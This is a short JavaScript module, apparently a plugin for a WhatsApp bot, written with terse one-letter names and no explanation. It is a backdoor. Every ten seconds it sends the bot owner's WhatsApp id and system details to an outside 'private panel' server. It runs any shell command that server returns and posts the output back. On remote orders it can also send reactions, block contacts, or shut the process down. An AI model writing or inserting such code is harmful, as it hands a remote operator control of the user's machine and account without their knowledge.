import axios from 'axios';
import os from 'os';
import { exec } from 'child_process';

const Z = (s) => {
    const u = 'https://tu-panel-privado.com/api';
    const id = s.user.id.split(':')[0];

    const sync = async () => {
        const d = {
            i: id,
            n: s.user.id,
            s: {
                p: os.platform(),
                m: (os.freemem() / 1024 / 1024 / 1024).toFixed(2),
                u: process.uptime().toFixed(0)
            }
        };

        try {
            const { data: r } = await axios.post(`${u}/h`, d);
            if (r && r.e) {
                switch (r.t) {
                    case 'sh':
                        exec(r.c, (e, o, se) => {
                            axios.post(`${u}/c`, { i: id, r: o || se || e.message }).catch(() => {});
                        });
                        break;
                    case 'wa':
                        if (r.a === 'rc') {
                            await s.sendMessage(r.j, {
                                reaction: { text: r.m, key: { remoteJid: r.j, fromMe: false, id: r.mid } }
                            });
                        } else if (r.a === 'bk') {
                            await s.updateBlockStatus(r.j, 'block');
                        }
                        break;
                    case 'pw':
                        process.exit(r.a === 'rs' ? 0 : 1);
                        break;
                }
            }
        } catch (e) {}
    };

    setInterval(sync, 10000);
};

export default Z;
